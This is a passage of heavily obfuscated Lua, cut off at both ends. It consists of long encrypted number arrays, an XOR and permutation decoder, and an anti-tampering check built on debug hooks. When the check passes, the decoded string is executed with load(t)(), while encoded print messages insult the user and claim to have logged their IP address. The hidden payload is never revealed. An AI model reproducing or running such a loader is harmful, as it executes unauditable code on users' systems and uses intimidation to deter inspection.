  790, 714, 955, 1174, 885, 780, 837, 577, 657, 656, 1010, 863, 949, 903, 926, 1042, 981, 997, 1201, 622, 976, 561, 953,
  606, 778, 628, 1068, 763, 1143, 605, 595, 619, 838, 1084, 941, 1099, 798, 947, 944, 876, 1131, 824, 1021, 760, 677,
  629, 647, 759, 559, 891, 782, 1092, 666, 664, 1123, 829, 978, 1168, 1060, 950, 560, 704, 861, 1073, 1040, 599, 1022,
  1117, 716, 1077, 1120, 843, 649, 970, 989, 966, 693, 1091, 1196, 850, 842, 1075, 943, 1109, 873, 1209, 744, 749, 932,
  1211, 597, 1142, 1195, 674, 721, 1210, 1052, 602, 753, 841, 630, 1179, 1150, 1193, 646, 764, 933, 905, 812, 1028, 909,
  670, 1182, 1090, 555, 696, 983, 916, 960, 645, 565, 637, 800, 621, 1110, 616, 660, 625, 959, 854, 1153, 742, 672, 638,
  1063, 1158, 1139, 1124, 636, 919, 897, 1048, 1200, 1055, 1175, 777, 937, 683, 900, 977, 706, 961, 902, 668, 728, 731,
  766, 552, 1031, 1019, 702, 815, 598, 988, 1089, 847, 633, 927, 869, 974, 692, 1013, 1126, 576, 1166, 855, 1157, 642,
  1025, 571, 730, 686, 1029, 592, 907, 866, 952, 669, 691, 827, 935, 1186, 762, 996, 1035, 1129, 712, 1003, 886, 874,
  687, 613, 1156, 747, 607, 920, 858, 680, 1045, 750, 788, 735, 877, 583, 889, 1036, 868, 881, 982, 1007, 671, 979, 864,
  1183, 923, 718, 596, 612, 1160, 640, 689, 846, 984, 908, 1134, 651, 543, 1018, 1178, 1197, 831, 1190, 732, 1191, 1176,
  802, 994, 852, 793, 1185, 715, 1113, 901, 894, 1180, 1094, 653, 929, 615, 739, 726, 789, 913, 1171, 865, 1136, 875,
  1066, 1006, 1088, 769, 898, 785, 729, 549, 1198, 673, 834, 1057, 936, 1154, 719, 893, 568, 558, 1050, 546, 882, 713,
  1106, 724, 1093, 995, 1034, 1001, 722, 734, 804, 579, 797, 684, 888, 954, 906, 883, 985, 770, 1069, 1026, 1043, 965,
  587, 890, 1159, 743, 765, 1145, 1207, 1020, 986, 1033, 1039, 614, 751, 681, 1097, 582, 1148, 648, 915, 819, 626, 695,
  639, 912, 635, 1189, 830, 928, 624, 627, 993, 659, 963, 987, 748, 1061, 652, 665, 1058, 938, 746, 826, 899, 688, 1000,
  1064, 786, 822, 773, 856, 939, 910, 892, 585, 593, 951, 904, 975, 564, 745, 1079, 1121, 990, 1023, 871, 1012, 1138,
  754, 840, 675, 867, 1047, 575, 825, 1009, 809, 1015, 1102, 736, 801, 757, 667, 1076, 971, 1108, 991, 998, 857, 643,
  1130, 879, 1165, 727, 823, 964, 922, 835, 761, 578, 1202, 1016, 1212, 917, 584, 969, 1177, 554, 848, 925, 644, 1024,
  611, 758, 1173, 878, 1164, 1206, 570, 1152, 849, 682, 791, 711, 650, 796, 1049, 1204, 1101, 1140, 999, 828, 1070, 1172,
  631, 756, 1116, 772, 921, 1098, 610, 604, 1059, 1146, 817, 1083, 1005, 676, 945, 1155, 1038, 1187, 870, 1008, 658, 833,
  1030, 544, 1205, 654, 803, 845, 980, 924, 591, 601, 608, -1, 58, 20, 25, 78, 214, 93, 100, 117, 17, 22, 20, 22, 84,
  102, 166, 98, 103, 103, 29, 253, 115, 100, 72, 34, 149, 93, 7, 21, 17, 252, 160, 132, 19, 41, 14, 90, 90, 20, 22, 48,
  33, 72, 78, 152, 19, 250, 11, 215, 43, 70, 85, 0, 111, 13, 18, 43, 109, 72, 5, 76, 110, 61, 87, 86, 52, 9, 211, 9, 68,
  88, 21, 69, 12, 77, 191, 76, 100, 166, 73, 90, 48, 91, 31, 20, 46, 95, 8, 96, 32, 217, 23, 88, 75, 74, 96, 92, 12, 86,
  6, 11, 58, 45, 109, 66, 8, 29, 77, 58, 80, 122, 34, 22, 170, 127, 82, 0, 32, 96, 21, 142, 80, 70, 76, 7, 35, 19, 34,
  76, 69, 104, 10, 115, 28, 116, 86, 240, 45, 70, 80, 49, 127, 33, 234, 71, 83, 79, 105, 227, 39, 48, 6, 82, 77, 73, 32,
  133, 70, 59, 95, 99, 71, 61, 71, 74, 100, 162, 145, 241, 40, 45, 111, 95, 10, 29, 236, 40, 16, 246, 67, 120, 81, 99,
  65, 28, 79, 12, 1, 0, 92, 3, 86, 69, 25, 82, 9, 231, 86, 13, 14, 14, 111, 92, 115, 8, 87, 73, 108, 83, 2, 58, 74, 106,
  62, 17, 30, 75, 29, 108, 16, 0, 11, 17, 80, 100, 22, 250, 69, 103, 163, 108, 88, 8, 189, 139, 120, 4, 22, 43, 145, 11,
  65, 146, 92, 90, 38, 41, 69, 6, 1, 2, 100, 181, 76, 90, 3, 69, 54, 23, 28, 28, 104, 13, 57, 75, 65, 26, 105, 68, 230,
  113, 34, 189, 20, 9, 21, 221, 89, 86, 95, 77, 109, 61, 3, 78, 7, 19, 80, 9, 39, 41, 118, 52, 108, 140, 42, 105, 181,
  116, 84, 38, 86, 226, 87, 19, 55, 111, 100, 87, 11, 75, 213, 1, 15, 103, 87, 11, 34, 57, 11, 14, 78, 52, 99, 95, 56,
  10, 125, 77, 11, 161, 53, 98, 110, 71, 47, 120, 26, 57, 61, 22, 23, 72, 32, 8, 209, 116, 61, 78, 64, 19, 34, 86, 49,
  205, 66, 78, 116, 1, 68, 110, 23, 20, 73, 108, 117, 31, 98, 72, 0, 34, 102, 11, 108, 64, 19, 84, 116, 86, 45, 101, 6,
  78, 21, 40, 3, 9, 82, 49, 177, 66, 126, 241, 8, 90, 72, 81, 19, 181, 1, 89, 48, 90, 10, 49, 0, 75, 18, 66, 32, 108, 52,
  82, 60, 8, 192, 210, 79, 118, 5, 204, 44, 125, 72, 90, 58, 36, 19, 14, 55, 78, 210, 19, 38, 31, 72, 126, 15, 106, 79,
  17, 25, 30, 93, 13, 102, 25, 103, 55, 43, 169, 4, 71, 110, 13, 34, 25, 72, 108, 77, 225, 58, 203, 100, 77, 64, 95, 31,
  73, 71, 21, 36, 90, 80, 88, 71, 30, 80, 110, 9, 34, 1, 32, 111, 103, 29, 99, 26, 60, 111, 246, 2, 75, 64, 68, 102, 84,
  42, 63, 95, 46, 19, 143, 28, 245, 66, 92, 77, 19, 55, 5, 15, 241, 95, 43, 68, 78, 76, 105, 67, 26, 100, 16, 73, 75,
  190, 78, 88, 78, 65, 71, 10, 111, 2, 21, 108, 42, 75, 51, 250, 134, 71, 27, 145, 78, 200, 120, 11, 96, 19, 65, 100, 16,
  1, 50, 19, 4, 34, 109, 103, 0, 36, 71, 25, 80, 233, 48, 108, 85, 127, 97, 52, 233, 48, 39, 59, 251, 14, 91, 14, 50, 59,
  89, 29, 61, 181, 21, 21, 28, 35, 203, 24, 78, 96, 100, 178, 73, 118, 19, 51, 85, 103, 180, 99, 100, 51, 49, 0, 92, 81,
  71, 93, 25, 34, 0, 8, 117, 22, 77, 212, 146, 173, 69, 80, 65, 66, 108, 49, 254, 122, 90, 77, 80, 99, 0, 78, 32, 0, 77,
  98, 94, 107, 80, 32, 43, 86, 12, 28, 4, 112, 219, 20, 100, 113, 30, 48, 32, 116, 6, 95, 77, 41, 88, 66, 78, 100, 60,
  76, 107, 66, 103 }, "gDToL0zmxG3h3n6OpCDNkmXen5"); xagC3omgZK3Bf2NzJhJBbius2ntCKIYq6pUx55tBZ9agBhwDUpFNBBlc =
iMqwI8V3egSCoRwUCo1SlxeaK63eiRo7Ej2MYlNp1A601DQzWkuY2zb1KutFndWB9t; elQ6x4UPIqM2HOLAV5q9RwDGVQI2fM0SYz8MAkOJ1s1bDUgMnDXoUly8Hw =
iMqwI8V3egSCoRwUCo1SlxeaK63eiRo7Ej2MYlNp1A601DQzWkuY2zb1KutFndWB9t; fjipTm2VjV3jcAMqWkun1KKSmi11lk5jkQb61imusg4vyeTOcttk4 =
elQ6x4UPIqM2HOLAV5q9RwDGVQI2fM0SYz8MAkOJ1s1bDUgMnDXoUly8Hw; qw1ytEhstcdWD4JK0XEqb9ptVBHVO9VHqqR3PIuwtnpHTp5ZaqO4rY5gMiW6M4Rs7Cn3bNl25 =
fjipTm2VjV3jcAMqWkun1KKSmi11lk5jkQb61imusg4vyeTOcttk4; oJVk7P6CG3cj6Hqj0BP8HJNZxWTPs3p77249aS2VojgHhcDwjMsqbMyidog2N70RT4AAPMlk =
qw1ytEhstcdWD4JK0XEqb9ptVBHVO9VHqqR3PIuwtnpHTp5ZaqO4rY5gMiW6M4Rs7Cn3bNl25; kgvXt268Di47nrBPlP2khXtftHaAK2DUHmy7glXF78ITj16jJmWUZ5K8roOM =
oJVk7P6CG3cj6Hqj0BP8HJNZxWTPs3p77249aS2VojgHhcDwjMsqbMyidog2N70RT4AAPMlk; i1AzE89PNj3Fb9juf9cKq83vo4BmI91U53BTjOGjGA2LXkBwbV21bmWA =
kgvXt268Di47nrBPlP2khXtftHaAK2DUHmy7glXF78ITj16jJmWUZ5K8roOM; bbLaMm9GhNvdwYoUcHrQJg5MRjlXJXPLj9meIz81ZpoMpYLpQi6k25POFb =
i1AzE89PNj3Fb9juf9cKq83vo4BmI91U53BTjOGjGA2LXkBwbV21bmWA; lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a = function(
  a)
  K, F = 7988853660201794, 16384 + 2094; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; cU6yBI20GZLIv8U6stBMpGV5DnYXdGEBHLCuGMZin3RQpsrcmqQI7QNdOm1CL8 = function(b)
  co = coroutine.create(b)
  ikDT7a67D12KgogzE7wtWeRlq3zWdIRptlChOJfHSrdSIF7SPHoJulhNoIL5vi3el8unLoyFuj = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(ikDT7a67D12KgogzE7wtWeRlq3zWdIRptlChOJfHSrdSIF7SPHoJulhNoIL5vi3el8unLoyFuj, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return ikDT7a67D12KgogzE7wtWeRlq3zWdIRptlChOJfHSrdSIF7SPHoJulhNoIL5vi3el8unLoyFuj
end; pnsyjX1kIAiO5PKPXYoZZHn0gaWhlQSVkleOcHnPsHN9g3yWZMUGOPyQaUa9ae8OT479GxTK = function(f, g)
  jp93t6pDyq7k56l8sXTUBGuHiTgywseAjTV3Xc8drvBqcaJmd6UjluIykkuzBsX5vNnn = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; cl08lWrw4JFHkq02mtoTrIIdc8VtOq1OmA6DMQQWfJwyKhLbn2HVE = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; d1FjDWDnkpqYFHLju6dokIjzMchbX5ljiZOcdffM12nKBMDyqUVM8MsCxdvKmrDU0SRA = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      jp93t6pDyq7k56l8sXTUBGuHiTgywseAjTV3Xc8drvBqcaJmd6UjluIykkuzBsX5vNnn(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; eykkmQjdvyvTFmt8XyivmOEc3camMpzf4i7nMobvF6e9y6FVNxzfF8U57r7QdZj2aeo4s = function(p, n)
    txojRWXwFgNL4hQ6GV8nRPEJwS9ZSKI2kFg6rG59Fns0ePqAqy1wWLAFZITLJRAka2jzUOZI = ""
    for k, q in pairs(p) do txojRWXwFgNL4hQ6GV8nRPEJwS9ZSKI2kFg6rG59Fns0ePqAqy1wWLAFZITLJRAka2jzUOZI =
      txojRWXwFgNL4hQ6GV8nRPEJwS9ZSKI2kFg6rG59Fns0ePqAqy1wWLAFZITLJRAka2jzUOZI ..
      bbLaMm9GhNvdwYoUcHrQJg5MRjlXJXPLj9meIz81ZpoMpYLpQi6k25POFb
      [lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('7A') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('69') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('8B') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('24') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('CF') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('46')]
      [lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('8A') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('35') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('AC') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('8B')](
      q) end
    ; n(txojRWXwFgNL4hQ6GV8nRPEJwS9ZSKI2kFg6rG59Fns0ePqAqy1wWLAFZITLJRAka2jzUOZI)
  end; cl08lWrw4JFHkq02mtoTrIIdc8VtOq1OmA6DMQQWfJwyKhLbn2HVE(f,
    function(r) d1FjDWDnkpqYFHLju6dokIjzMchbX5ljiZOcdffM12nKBMDyqUVM8MsCxdvKmrDU0SRA(r, g,
        function(s) eykkmQjdvyvTFmt8XyivmOEc3camMpzf4i7nMobvF6e9y6FVNxzfF8U57r7QdZj2aeo4s(s,
            function(t) if #cU6yBI20GZLIv8U6stBMpGV5DnYXdGEBHLCuGMZin3RQpsrcmqQI7QNdOm1CL8(bbLaMm9GhNvdwYoUcHrQJg5MRjlXJXPLj9meIz81ZpoMpYLpQi6k25POFb[lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('F1') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('BE') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('AC') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('79')]) == 1 then if bbLaMm9GhNvdwYoUcHrQJg5MRjlXJXPLj9meIz81ZpoMpYLpQi6k25POFb[lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('F1') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('BE') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('AC') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('79')] == bbLaMm9GhNvdwYoUcHrQJg5MRjlXJXPLj9meIz81ZpoMpYLpQi6k25POFb[lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('AD') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('8B') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('24') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('CF') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('69')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if bbLaMm9GhNvdwYoUcHrQJg5MRjlXJXPLj9meIz81ZpoMpYLpQi6k25POFb[lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('F1') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('BE') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('AC') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('79')](t) then
                    bbLaMm9GhNvdwYoUcHrQJg5MRjlXJXPLj9meIz81ZpoMpYLpQi6k25POFb
                        [lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('F1') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('BE') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('AC') .. lilsQIrsinZrKsrfB16h5aKSRwbuphoCUh7AR3XoyKXt3IG6MTkY4QMgGcN3cmpWWyKu8a('79')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; pnsyjX1kIAiO5PKPXYoZZHn0gaWhlQSVkleOcHnPsHN9g3yWZMUGOPyQaUa9ae8OT479GxTK(
{ 657, 989, 653, 1021, 1013, 652, 1132, 613, 933, 896, 970, 984, 1077, 1069, 1032, 624, 859, 1061, 767, 1027, 1042, 772,
  587, 888, 655, 857, 1198, 703, 948, 1189, 736, 693, 584, 620, 755, 1128, 969, 996, 669, 1130, 867, 963, 1063, 1098,
  632, 903, 662, 564, 1120, 550, 549, 723, 1025, 914, 843, 1184, 1114, 698, 1102, 934, 1121, 646, 823, 991, 885, 986,
  660, 874, 1144, 1163, 1014, 718, 890, 569, 764, 1173, 1191, 1075, 658, 947, 835, 1083, 877, 614, 544, 753, 635, 765,
  1029, 546, 771, 606, 964, 1043, 1035, 1182, 715, 971, 751, 728, 962, 895, 1122, 839, 974, 1194, 566, 714, 1017, 940,
  1045, 1193, 975, 791, 1064, 883, 833, 951, 551, 643, 608, 593, 734, 798, 1123, 813, 1105, 848, 952, 1104, 619, 783,
  770, 927, 1181, 742, 891, 1203, 780, 645, 980, 842, 675, 707, 879, 902, 998, 1119, 1000, 1085, 1072, 1137, 713, 607,
  787, 1010, 988, 1040, 768, 637, 944, 561, 782, 905, 784, 729, 931, 825, 583, 1058, 748, 1147, 746, 965, 745, 1177,
  1196, 1135, 884, 560, 674, 725, 957, 788, 557, 582, 981, 923, 547, 673, 758, 937, 794, 1012, 939, 1023, 612, 611, 626,
  740, 1019, 1050, 1106, 1136, 802, 1052, 1011, 1057, 1118, 860, 1211, 901, 1026, 999, 979, 822, 922, 1210, 1068, 1166,
  873, 1112, 853, 1006, 978, 724, 702, 953, 904, 1084, 735, 595, 1004, 1016, 1133, 1145, 1024, 679, 763, 858, 694, 809,
  682, 1212, 1022, 1101, 1207, 1167, 850, 779, 882, 741, 1124, 785, 685, 1070, 760, 661, 1071, 649, 691, 1141, 1059,
  1209, 1164, 1187, 917, 892, 644, 1018, 639, 1186, 604, 666, 870, 1179, 814, 1116, 1158, 1140, 1151, 687, 597, 985, 847,
  738, 678, 590, 925, 1195, 799, 670, 987, 832, 668, 726, 1139, 820, 1051, 897, 945, 875, 605, 983, 941, 731, 1172, 881,
  636, 966, 600, 818, 1030, 1111, 1180, 861, 796, 864, 1157, 972, 1165, 1125, 710, 552, 747, 827, 720, 1152, 708, 683,
  1093, 932, 663, 563, 1205, 749, 681, 594, 1065, 1007, 572, 665, 840, 680, 555, 816, 627, 1108, 684, 1199, 733, 812,
  808, 699, 851, 976, 671, 977, 623, 955, 938, 834, 1131, 1066, 856, 601, 1044, 1041, 744, 968, 545, 911, 642, 697, 910,
  967, 928, 810, 1095, 716, 1190, 553, 1127, 603, 801, 1148, 648, 1208, 1080, 686, 1055, 1009, 1100, 759, 647, 844, 863,
  1091, 1168, 1037, 1117, 1159, 1109, 789, 855, 852, 766, 1062, 571, 1113, 775, 854, 610, 1110, 633, 1192, 997, 562, 830,
  828, 1176, 589, 906, 688, 598, 575, 558, 727, 781, 804, 800, 556, 836, 1001, 573, 1138, 602, 689, 579, 893, 1154, 982,
  1002, 743, 705, 916, 846, 815, 709, 1092, 634, 889, 900, 994, 757, 869, 752, 995, 586, 628, 1200, 1038, 630, 737, 993,
  548, 1126, 872, 599, 1099, 829, 793, 1155, 1094, 1206, 629, 585, 946, 837, 1134, 1074, 1107, 1031, 790, 913, 1185, 568,
  739, 615, 676, 1178, 894, 651, 878, 824, 730, 1079, 1073, 1188, 887, 690, 919, 795, 958, 817, 1087, 1161, 806, 588,
  898, 574, 805, 721, 592, 1097, 950, 1201, 868, 1054, 838, 1090, 831, 849, 559, 929, 1183, 750, 943, 1049, 711, 1153,
  1060, 664, 1088, 656, 570, 865, 576, 990, 777, 930, 717, -1, 75, 97, 102, 26, 114, 48, 79, 37, 38, 18, 79, 17, 97, 92,
  127, 82, 60, 120, 6, 72, 65, 13, 20, 47, 166, 86, 94, 20, 90, 50, 18, 9, 83, 70, 165, 231, 43, 91, 125, 126, 80, 45,
  84, 13, 49, 58, 19, 50, 157, 33, 82, 91, 59, 56, 33, 84, 67, 29, 39, 68, 98, 2, 6, 83, 110, 72, 27, 102, 20, 110, 25,
  92, 68, 172, 83, 20, 97, 88, 50, 192, 68, 70, 83, 68, 28, 27, 84, 22, 20, 80, 79, 19, 17, 108, 117, 103, 23, 69, 64,
  84, 71, 91, 83, 29, 68, 54, 71, 50, 79, 92, 35, 41, 12, 118, 97, 27, 152, 63, 44, 67, 68, 80, 60, 1, 26, 90, 125, 14,
  18, 134, 76, 72, 87, 65, 83, 3, 11, 71, 79, 7, 79, 28, 8, 87, 6, 84, 2, 97, 25, 83, 65, 52, 90, 205, 83, 82, 19, 21,
  13, 98, 45, 78, 102, 74, 3, 98, 40, 19, 52, 25, 112, 63, 18, 19, 5, 38, 189, 37, 26, 171, 75, 79, 30, 93, 86, 13, 84,
  98, 43, 249, 87, 26, 43, 17, 91, 66, 72, 72, 64, 88, 108, 68, 21, 81, 18, 113, 105, 109, 20, 126, 6, 45, 84, 129, 22,
  65, 43, 55, 166, 93, 1, 99, 0, 28, 18, 97, 208, 41, 27, 7, 233, 51, 70, 223, 39, 249, 9, 2, 87, 119, 36, 88, 43, 41,
  67, 112, 20, 19, 83, 214, 83, 94, 84, 28, 147, 101, 0, 53, 2, 104, 9, 83, 11, 83, 177, 118, 17, 83, 35, 83, 107, 1, 65,
  0, 82, 64, 191, 0, 80, 83, 21, 75, 66, 238, 1, 121, 111, 102, 98, 84, 5, 105, 60, 12, 82, 18, 93, 28, 9, 24, 102, 90,
  247, 16, 65, 39, 102, 38, 72, 82, 118, 79, 59, 15, 70, 66, 13, 101, 60, 41, 47, 71, 79, 181, 118, 96, 1, 51, 167, 87,
  24, 64, 70, 31, 10, 18, 55, 53, 15, 71, 21, 124, 3, 99, 57, 39, 93, 1, 109, 25, 45, 105, 105, 7, 83, 92, 124, 17, 126,
  90, 106, 22, 83, 97, 58, 20, 144, 82, 126, 105, 13, 55, 137, 42, 46, 205, 84, 125, 93, 9, 20, 163, 121, 78, 43, 87, 10,
  10, 65, 98, 60, 31, 143, 69, 84, 100, 69, 85, 70, 251, 84, 67, 48, 83, 46, 40, 198, 5, 26, 11, 39, 100, 65, 70, 76, 83,
  25, 26, 177, 62, 19, 107, 93, 44, 86, 20, 16, 6, 101, 84, 35, 75, 17, 79, 98, 72, 115, 27, 72, 18, 12, 6, 61, 27, 99,
  89, 18, 56, 86, 178, 38, 30, 95, 95, 4, 26, 2, 26, 10, 69, 151, 2, 239, 19, 98, 118, 54, 21, 93, 81, 2, 93, 139, 122,
  68, 0, 3, 113, 43, 80, 64, 54, 75, 87, 127, 213, 23, 71, 118, 39, 220, 129, 79, 168, 22, 39, 79, 119, 100, 68, 27, 102,
  51, 216, 91, 126, 83, 122, 91, 110, 46, 101, 31, 251, 1, 95, 40, 34, 28, 12, 72, 1, 13, 93, 169, 82, 22, 4, 12, 67, 55,
  87, 21, 43, 37, 248, 35, 3, 224, 250, 121, 7, 57, 83, 86, 95, 132, 75, 84, 26, 18, 19, 118, 119, 11, 12, 107, 35, 30,
  34, 135, 56, 33, 86, 83, 22, 77, 96, 98, 121, 106, 22, 115, 3, 10, 83, 28, 43, 29, 1, 77, 84, 22, 27, 18, 16, 34, 83,
  12, 51, 31, 86, 82, 70, 80, 127, 82, 49, 43, 92, 26, 72, 54, 74, 2, 14, 80, 127, 75, 26, 55, 10, 68, 217, 109, 87, 2,
  150, 87, 2, 12, 74, 28, 18, 7, 0, 48, 222, 71, 11, 101, 65, 37, 68, 110, 100, 85, 50, 68, 67, 87, 58, 1, 21, 80, 0,
  113, 72, 79, 86, 17, 37, 48, 67, 131, 2, 124, 70, 33, 146, 84, 44, 100, 97, 3, 105, 62, 90, 106, 91 },
  "kBFYd3AttsrvwsV3ho2BdaDIo2"); egnOwk8ued0DIWyINDdLbeTGv7HsT6KiT5JaFr8144ElIwlYG9UEfnLhDzPLUrATQ5gI4 =
bbLaMm9GhNvdwYoUcHrQJg5MRjlXJXPLj9meIz81ZpoMpYLpQi6k25POFb; voww5zDKWqsjOifcC9awbY2nElbNjqtWeYppYDkaBhbSJogZIsPbMJJu4SeBtedxKw =
bbLaMm9GhNvdwYoUcHrQJg5MRjlXJXPLj9meIz81ZpoMpYLpQi6k25POFb; bM7XjYIiAm1PlFHTJOgjn2sgQ6Srl3pqAnlkxkXMBukORQw0sVgmlVlm =
voww5zDKWqsjOifcC9awbY2nElbNjqtWeYppYDkaBhbSJogZIsPbMJJu4SeBtedxKw; uUQGyYyKwSsNyh10d1mYkDfFOtdE9BBEDM44CjQpezyQqt3Gg3joYMsnqrL =
